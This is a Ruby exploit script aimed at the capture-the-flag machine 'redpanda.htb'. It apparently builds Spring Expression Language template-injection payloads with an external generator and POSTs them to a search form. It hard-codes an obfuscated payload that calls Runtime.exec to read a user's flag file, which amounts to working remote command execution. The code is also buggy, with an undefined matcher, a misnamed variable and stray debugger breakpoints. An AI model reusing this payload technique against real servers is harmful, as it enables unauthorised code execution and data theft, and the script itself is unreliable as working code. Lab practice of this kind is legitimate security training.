#!/bin/env ruby

require 'json'
require 'net/http'
require 'pry'

BASE_URL = 'http://redpanda.htb:8080/search'

def generate(command)
    cmd = sprintf('python ./ssti-payload/ssti-payload.py -u %s', command)
    results = `#{cmd}`

    binding.pry

    result.gsub('%24','%2A').chomp
end

KNOWN_COMMAND = '%2A%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%2899%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2832%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28104%29%29.concat%28T%28java.lang.Character%29.toString%28111%29%29.concat%28T%28java.lang.Character%29.toString%28109%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28119%29%29.concat%28T%28java.lang.Character%29.toString%28111%29%29.concat%28T%28java.lang.Character%29.toString%28111%29%29.concat%28T%28java.lang.Character%29.toString%28100%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%28110%29%29.concat%28T%28java.lang.Character%29.toString%28107%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28117%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%28114%29%29.concat%28T%28java.lang.Character%29.toString%2846%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%28120%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29%29.getInputStream%28%29%29%7D'

def run(command)
    uri = URI.parse(BASE_URL)

    http = Net::HTTP.new(uri.host, uri.port)

    request = Net::HTTP::Post.new(uri.request_uri)
    request.body = sprintf('name=%s', command)
    request['Content-Type'] = 'application/x-www-form-urlencoded'

    response = http.request(request)

    if response.code.eql?('200')
      if response.body.match(RESPONSE_MATCHER)
        return $1
      end

      binding.pry
    else
      return JSON.parse(response.body)
    end

    binding.pry

end

def log(message, level = :debug)
    puts sprintf('[%s] [%5s] %s', Time.now.strftime('%H:%M.%S'), level.to_s.upcase!, message)
    exit(1) if level.eql?(:fatal)
end


g = generate("cat /home/woodenk/user.txt")

binding.pry

r = run(g)

binding.pry
